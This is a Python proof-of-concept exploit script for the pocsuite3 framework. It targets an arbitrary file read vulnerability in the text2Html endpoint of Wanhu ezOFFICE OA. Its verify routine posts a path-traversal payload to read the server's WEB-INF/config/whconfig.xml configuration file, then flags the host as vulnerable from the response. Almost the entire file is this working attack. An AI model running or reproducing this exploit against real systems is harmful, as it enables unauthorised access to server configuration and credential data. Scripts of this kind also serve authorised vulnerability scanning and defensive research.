# _*_ coding:utf-8 _*_
# @Time : 2024/1/27
# @Author: 炼金术师诸葛亮
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD, random_str

class wanhu_text2html_fileread(POCBase):
    pocDesc = '''万户OA text2Html 任意文件读取漏洞'''
    author = '炼金术师诸葛亮'
    createDate = '2024-1-27'
    name = '万户OA text2Html 任意文件读取漏洞'
    #app="万户网络-ezOFFICE"

    def _verify(self):

        result = {}
        url = self.url+ '/defaultroot/convertFile/text2Html.controller'
        headers={
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36",
            'Connection': 'close',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept-Encoding': 'gzip',
            'SL-CE-SUID': '1081'

        }


        try:

            data = 'saveFileName=123456/../../../../WEB-INF/config/whconfig.xml&moduleName=html'
            response = requests.post(url,headers=headers,data=data)
            if response.status_code == 200 and 'div' in response.text:
                result['VerifyInfo'] = {}


            return self.parse_output(result)
        except Exception as e:
            pass

register_poc(wanhu_text2html_fileread)
